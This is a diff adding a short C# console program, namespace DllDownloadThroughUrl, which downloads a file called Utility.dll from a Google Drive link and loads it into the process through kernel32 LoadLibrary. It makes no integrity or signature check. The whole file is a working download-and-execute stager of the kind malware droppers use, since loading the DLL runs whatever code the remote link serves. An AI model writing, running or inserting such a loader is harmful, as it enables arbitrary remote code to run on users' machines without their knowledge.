@@ -1,0 +1,43 @@
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+
+namespace DllDownloadThroughUrl
+{
+    internal static class NativeMethod
+    {
+        //unload the method Win32 API into the application
+        [DllImport("kernel32.dll")]
+        internal static extern IntPtr LoadLibrary(string dllToLoad);
+    }
+
+    internal class Program
+    {
+        protected Program() { }
+
+        private static void Main(string[] args) {
+            string remoteUri = "https://drive.google.com/uc?export=download&id=1gGQMXl09o_RnSO8IVZwqW-_NSvyg7vPi";
+            string fileName = "Utility.dll";
+            //file download stage
+            using (WebClient webClient = new WebClient()) {
+                try {
+                    Console.WriteLine("download start...");
+                    webClient.DownloadFile(remoteUri, fileName);
+                    Console.WriteLine("downloaded");
+                }
+                catch (Exception ex) {
+                    Console.WriteLine(ex.Message);
+                }
+            }
+            //get the path to the loaded Dll
+            string executionPath = AppDomain.CurrentDomain.BaseDirectory + fileName;
+            //load the library
+            try {
+                NativeMethod.LoadLibrary(executionPath);
+            }
+            catch (Exception ex) {
+                Console.WriteLine(ex.Message);
+            }
+        }
+    }
+}
